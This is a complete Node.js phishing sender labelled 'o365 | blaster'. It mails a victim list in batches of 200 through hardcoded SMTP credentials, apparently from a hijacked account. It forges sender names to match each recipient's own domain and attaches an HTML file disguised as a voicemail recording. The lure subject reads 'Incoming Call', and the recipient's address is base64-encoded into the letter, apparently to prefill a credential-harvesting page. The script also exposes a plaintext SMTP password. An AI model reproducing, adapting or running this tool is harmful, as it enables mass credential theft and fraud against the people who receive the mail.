'use strict'; // 'QXPRp95wIVT2cG2p%T)'
const nodemailer = require('nodemailer');
const chalk = require('chalk');
const delay = require('delay');
const _ = require('lodash');
const fs = require('fs');
const randomstring = require('randomstring');

async function checkSMTP(data) {
    try {
        let transporter = nodemailer.createTransport({
            pool: true,
            host: data.host,
            port: data.port,
            secure: data.secure,
            auth: {
                user: data.user,
                pass: data.pass
            }
        });
        await transporter.verify();
        return Promise.resolve(transporter);
    } catch(err) {
        return Promise.reject(`SMTP ERROR => ${err.message}`);
    }
}

async function readFrom(from, email) {
    try {
        from = from.replace(/USER/g, email.replace(/@[^@]+$/, ''));
        from = from.replace(/DOMC/g, email.match(/(?<=@)[^.]+(?=\.)/g)[0].charAt(0).toUpperCase() + email.match(/(?<=@)[^.]+(?=\.)/g)[0].slice(1));
        from = from.replace(/DOMs/g, email.match(/(?<=@)[^.]+(?=\.)/g)[0]);
        from = from.replace(/DOMAIN/g, email.replace(/.*@/, ''));
        from = from.replace(/SILENTCODERSEMAIL/g, email);
        from = from.replace(/SILENTCODERSLIMAHURUF/g, randomstring.generate({length: 5, charset: 'alphabetic'}));
        from = from.replace(/SILENTCODERSBANYAKHURUF/g, randomstring.generate({length: 50, charset: 'alphabetic'}));
        from = from.replace(/SILENTCODERSNUMBER/g, randomstring.generate({length: 6, charset: 'numeric'}));
        return Promise.resolve(from);
    } catch(err) {
        return Promise.reject(err);
    }
}

async function timezoneSet(timezone, options, timeoption) {
    let nDate;
    if(options === 1) { // Wednesday, June 29, 2022
        if(timeoption === 1) { // 24 hours
            nDate = new Date().toLocaleDateString('en-us', {
                weekday: 'long', 
                year: 'numeric', 
                month: 'long', 
                day: 'numeric',
                hour12: false,
                timeZone: timezone,

            });
            return Promise.resolve(nDate);
        } else { // 12 hours
            nDate = new Date().toLocaleDateString('en-us', {
                weekday: 'long', 
                year: 'numeric', 
                month: 'long', 
                day: 'numeric',
                hour12: true,
                timeZone: timezone,
                day: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit'
            });
            return Promise.resolve(nDate);
        }
    } else if(options === 2) { // 29/06/2022
        if(timeoption === 1) { // 24 hours
            nDate = new Date().toLocaleString('en-us', {
                day: "2-digit",
                month: "2-digit",
                year: "numeric",
                timeZone: timezone,
                hour12: false,
                day: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit'
            });
            return Promise.resolve(nDate);
        } else { // 12 hours
            nDate = new Date().toLocaleString('en-us', {
                day: "2-digit",
                month: "2-digit",
                year: "numeric",
                timeZone: timezone,
                hour12: true,
                day: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit'
            });
            return Promise.resolve(nDate);
        }
    }
}

async function readLetter(letter, email, timezone, optionstime) {
    try {
        let sletter = await fs.readFileSync(letter, 'utf-8');
        const timex = await timezoneSet(timezone, 1, optionstime);
        sletter = sletter.replace(/SILENTCODERSTIMEZONE/g, timex);
        sletter = sletter.replace(/SILENTCODERSEMAIL/g, email);
        sletter = sletter.replace(/EMAILURLSILENTC0DERS/g, Buffer.from(email).toString('base64'));
        sletter = sletter.replace(/SILENTCODERSLIMAHURUF/g, randomstring.generate({length: 5, charset: 'alphabetic'}));
        sletter = sletter.replace(/SILENTCODERSBANYAKHURUF/g, randomstring.generate({length: 50, charset: 'alphabetic'}));
        sletter = sletter.replace(/SILENTCODERSNUMBER/g, randomstring.generate({length: 6, charset: 'numeric'}));
        sletter = sletter.replace(/USER/g, email.replace(/@[^@]+$/, ''));
        sletter = sletter.replace(/DOMAIN/g, email.replace(/.*@/, ''));
        sletter = sletter.replace(/DOMC/g, email.match(/(?<=@)[^.]+(?=\.)/g)[0].charAt(0).toUpperCase() + email.match(/(?<=@)[^.]+(?=\.)/g)[0].slice(1));
        sletter = sletter.replace(/DOMs/g, email.match(/(?<=@)[^.]+(?=\.)/g)[0]);
        return Promise.resolve(sletter);
    } catch(err){
        return Promise.reject(err);
    }
}

async function readLetterAttachments(letter, email) {
    try {
        let sletter = await fs.readFileSync(letter, 'utf-8');
        sletter = sletter.replace(/SILENTCODERSEMAIL/g, email);;
        return Promise.resolve(sletter);
    } catch(err){
        return Promise.reject(err);
    }
}

async function readSubject(subject, email) {
    try {
        subject = subject.replace(/USER/g, email.replace(/@[^@]+$/, ''));
        subject = subject.replace(/DOMAIN/g, email.replace(/.*@/, ''));
        subject = subject.replace(/DOMC/g, email.match(/(?<=@)[^.]+(?=\.)/g)[0].charAt(0).toUpperCase() + email.match(/(?<=@)[^.]+(?=\.)/g)[0].slice(1));
        subject = subject.replace(/DOMs/g, email.match(/(?<=@)[^.]+(?=\.)/g)[0]);
        subject = subject.replace(/SILENTCODERSEMAIL/g, email);
        subject = subject.replace(/SILENTCODERSLIMAHURUF/g, randomstring.generate({length: 5, charset: 'alphabetic'}));
        subject = subject.replace(/SILENTCODERSBANYAKHURUF/g, randomstring.generate({length: 50, charset: 'alphabetic'}));
        return Promise.resolve(subject);
    } catch(err) {
        return Promise.reject(err);
    }
}

(async function() {
    console.log(chalk`
{green NODE - Sender Updated}
{bold.red o365 | blaster} 
    `);
    if (process.argv[2] == undefined) {
        console.log('Usage : node file.js listname.txt');
        process.exit(1);
    }
    let smtpConfig = {
        host: 'smtp.kagoya.net', // smtp server
        port: '465', // port
        secure: false, // if port 587, false. if port 465 = true
        user: 'kir832968.info-tsuchiura',  // smtp user
        pass: 'seq83n7w'   //smtp pass
		
		
    };
	
    const transporter = await checkSMTP(smtpConfig);
    console.log(chalk`{bold.blue [!] SMTP Checked, Ready to Blast!!!! !}\n`);
    console.log(chalk`{bold.blue [>] Open list file, ${process.argv[2]}.}`);
    let mailist = await fs.readFileSync(process.argv[2], 'utf-8');
    let emailist = mailist.split(/\r?\n/);
    console.log(chalk`{bold.green [!] Found ${emailist.length} line.}\n`);
    emailist = _.chunk(emailist, 200);
    for(let i = 0; i < emailist.length; i++) {


        await Promise.all(emailist[i].map(async(email) => {
            if(email.match(/^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/)) {
                const doL = await readLetter('letter.html', email, "Australia/Adelaide", 1);
                const doF = await readFrom('DOMC <SILENTCODERSEMAIL>', email);  // sender name and email
                const doS = await readFrom('=?UTF-8?B?SW5jb21pbmcgQ2FsbCB3aXRoICsxICoqKiAqKiogb24gT2N0IDAzLCAyMDIy?=', email); // subject
                try {
                    let mailConfig = {
                        from: doF,
                        html: doL,
                        subject: doS,
                        to: email,
                        headers: {
                        },
						  attachments: [{
                            filename: "▶ 🔘─────── 1:26 Voice-Attchment.919-340-XXXX.wav.html", // file name to appear to victim
                            content: await readLetterAttachments(__dirname+'/a.html', email) // attachment file
                        }]					 
						
                    };  
                    await transporter.sendMail(mailConfig);
                    console.log(chalk`${chalk.green('Email')}-{bold ${email} {red >>} {green sent successfully!}}`);
                } catch(err) {
                    console.log(chalk`{red ${email} => ERROR : ${err.message}}`);
                }
            }
        }));


    }
})();